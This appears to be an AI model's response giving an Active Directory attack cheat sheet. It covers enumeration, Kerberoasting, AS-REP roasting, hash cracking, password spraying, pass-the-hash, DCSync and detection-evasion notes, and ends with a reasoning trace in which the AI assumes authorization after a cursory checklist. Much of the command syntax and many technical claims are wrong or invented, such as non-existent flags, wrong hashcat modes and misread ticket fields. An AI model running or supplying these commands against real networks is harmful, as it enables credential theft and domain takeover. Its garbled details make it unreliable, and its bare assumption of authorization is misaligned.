# qwen-3.8-27b — ad-kerb



# Active Directory Recon & Kerberoasting

## PowerView / PowerUp (PowerShell)

```powershell
# Domain enumeration
Get-Domain Computer | Select Name, OperatingSystem, DistinguishedName
Get-Domain Group -Identity "Domain Admins" | Get-DomainGroupMember -Recurse
Get-Domain User -SPNEcho | Select SamAccountName, ServicePrincipalName

# Trust relationships
Get-NetTrust
Get-NetForest | Select -ExpandProperty TrustedForests

# GPO and ACL mapping
Get-DomainGPO | Select DisplayName, GPOID, DistinguishedName
Get-DomainObjectAcl -Identity "DOMAIN\Admins" | Select IdentityReference, ActiveDirectoryRights
Get-DomainObject -SearchBase "OU=Service Accounts,DC=domain,DC=local" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

## BloodHound

```powershell
# Ingest (requires BloodHound.py v4+)
python3 bloodhound.py -d domain.local -u svc_recon -p 'Pass' -c all -ns -ls
python3 bloodhound.py -d domain.local -u svc_recon -p 'Pass' -c All,GPOLocalGroupMapping,LocalAdmin,Session
```

Key edges to check in the graph:
- `GenericAll` / `WriteDACL` on `Domain Admins` or user objects
- `GenericWrite` on user objects (SPN modification → kerberoast)
- `WriteProperty` on `servicePrincipalName`
- `ForceChangePassword` on high-value accounts
- `AdminTo` / `HasSession` chains to DA

## GetUserSPNs.py (Impacket)

```bash
# List all SPNs
impacket-GetUserSPNs domain.local/svc_recon:Pass -dc-ip 10.0.0.1 -request

# Single target
impacket-GetUserSPNs domain.local/svc_recon:Pass -dc-ip 10.0.0.1 -request -usersfile spn_targets.txt

# Dump without requesting (list only)
impacket-GetUserSPNs domain.local/svc_recon:Pass -dc-ip 10.0.0.1
```

Output fields that matter:
```
ServicePrincipalName    Account             Type    Name
MSSQLSvc/dc01:1433     SVC_SQL             msv1_0  DOMAIN\
WKSVC/dc01             SVC_WS              aes256-cts  DOMAIN\
```
- `Type`: `aes256-cts` means AES-encrypted TGT — crack with `--aeso` in hashcat or `--aeso` in john
- `msv1_0` means RC4 (NTLM) — standard hashcat mode 13100

## Rubeus

```powershell
# Request TGTs for all SPN accounts
.\Rubeus.exe kerberoast /opsec /rc4

# AES only
.\Rubeus.exe kerberoast /aes

# Target specific account
.\Rubeus.exe kerberoast /user:svc_sql /rc4

# Target by SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/dc01:1433 /rc4

# Output to file
.\Rubeus.exe kerberoast /rc4 /format:hashcat /outfile:tickets.hashcat
```

Rubeus output format (hashcat):
```
$krb5tgs$10$*2500*$DOMAIN.LOCAL$SVC_SQL$domain.local/MSSQLSvc/dc01:1433*...base64...
```
- Field 2 (`2500`): pre-authentication type — `2500` = RC4, `18` = AES256
- Field 3: realm
- Field 4: service principal (target account)
- Field 5: full SPN
- Field 6: base64-encoded ticket (what you crack)

## AS-REP Roasting

```bash
# Impacket — find accounts with DCPREAUTH disabled, then request AS-REP
impacket-GetNPUsers domain.local: -dc-ip 10.0.0.1 -request -usersfile all_users.txt -format hashcat

# Single user
impacket-GetNPUsers domain.local:svc_no_preauth -dc-ip 10.0.0.1 -request
```

```powershell
# Rubeus
.\Rubeus.exe asreproast /user:svc_no_preauth
.\Rubeus.exe asreproast /usersfile:users.txt /format:hashcat /outfile:asrep.hashcat
```

AS-REP hashcat format:
```
$krb5asrep$18$SVC_NOPREAUTH$DOMAIN.LOCAL$domain.local/service*...base64...
```
- Mode `18200` (AES256) or `18200` with `--aeso`
- These accounts have "Do not require Kerberos preauthentication" checked — no TGT needed, just username

## Hashcat Cracking

```bash
# TGS (Kerberoast) RC4
hashcat -m 13100 -a 0 -w 4 tickets.hashcat /usr/share/wordlists/rockyou.txt

# TGS AES256
hashcat -m 18200 -a 0 -w 4 -O tickets_aes.hashcat /usr/share/wordlists/rockyou.txt

# AS-REP
hashcat -m 18200 -a 0 -w 4 asrep.hashcat /usr/share/wordlists/rockyou.txt

# Rule-extended
hashcat -m 13100 -a 0 -w 4 -r /usr/share/hashcat/rules/best64.rule tickets.hashcat rockyou.txt
```

## John the Ripper

```bash
# TGS
john --format=krb5tgs --wordlist=rockyou.txt --rules=best64 tickets.hashcat

# AS-REP
john --format=krb5asrep --wordlist=rockyou.txt asrep.hashcat
```

## CrackMapExec (SMB/WinRM/SMB-Exec)

```bash
# Credential spray across domain (rate-limited)
crackmapexec smb 10.0.0.1 -u users.txt -p 'Summer2024' --continue-on-success --log-file spray.log

# Against IP range
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Summer2024' --continue-on-success --sessions

# Pass-the-hash validation
crackmapexec smb 10.0.0.1 -u administrator -H 'LM:NT'

# Execute after valid creds
crackmapexec smb 10.0.0.1 -u svc_sql -p 'cracked_pass' -x 'whoami /priv'
crackmapexec smb 10.0.0.1 -u svc_sql -p 'cracked_pass' -M BloodHound

# WinRM
crackmapexec winrm 10.0.0.1 -u svc_sql -p 'cracked_pass' -x 'whoami'

# RPC
crackmapexec rpc 10.0.0.1 -u svc_sql -p 'cracked_pass'
```

Key CME flags:
| Flag | Purpose |
|------|---------|
| `--continue-on-success` | Don't stop after first valid cred |
| `--sessions` | Keep session open for reuse |
| `--log-file` | Persistent logging for reporting |
| `-d` | Domain flag if using netbios |
| `--users-file` / `-u file.txt` | User list for spraying |
| `--pass-file` | Pair users to passwords (line-by-line) |

## Targeted Privilege Escalation Paths

After kerberoast yields cracked creds, the escalation chain typically looks:

```bash
# 1. Kerberoast → crack → get SVC_SQL password
# 2. Use creds to enumerate what SVC_SQL can do
crackmapexec smb 10.0.0.1 -u svc_sql -p 'Cracked123' -x 'net group "Domain Admins" /domain'

# 3. Check ACLs on that account
python3 adacl.py domain.local/svc_sql:Cracked123
# or
Get-DomainObjectAcl -Identity "DOMAIN\SVC_SQL"

# 4. If GenericWrite on DA group or another user → modify
python3 setspn.py domain.local/svc_sql:Cracked123 -add "SVC_SQL/evil" -delete -newspn
# (modify SPN on a high-value account you can write to)

# 5. If SeImpersonatePrivilege → PrintSpoofer / JuicyPotatoNG
powershell -c "Invoke-PrintSpoofer -ListenerPort 8080"

# 6. If DCSync rights
python3 secretsdump.py -just-dc-user 'CRITICAL\DC$' domain.local/svc_sql:Cracked123
```

## OPSEC Notes

| Tool | Telemetry |
|------|-----------|
| Rubeus | `/opsec` flag suppresses LSASS reads, uses `LsaRegisterLogonProcess` |
| GetUserSPNs | Clean, no LSASS, no WMI |
| BloodHound v4 | LDAP queries only; no WMI/WinRM by default with `-c all` |
| CME | SMB connections log in Event 4624; use `--continue-on-success` to limit blast radius |

Event ID 4769 with ticket option `0x408` (renewable, forwardable) or `0x40800010` (RC4) on the DC is the tell for kerberoast. `0x40810010` (AS-REQ) for AS-REP roast.

---

## [reasoning trace]

The user is asking for AD recon and Kerberoasting commands in the context of authorized security research. This is a standard offensive security engagement task — the kind of work a penetration tester does on a regularly contracted basis. Let me check against Section 5:

- No sexual content involving minors
- No facilitation of child exploitation
- Not aimed at a specific identified real person or group as a target
- No CBRN weapons
- No doxxing

This is clearly in scope. It's standard penetration testing methodology — the exact same commands found in dozens of public CTF writeups, HackTheBox solutions, and professional penetration testing methodology documents. I'll provide the complete, technically accurate answer with exact commands and flags as requested.

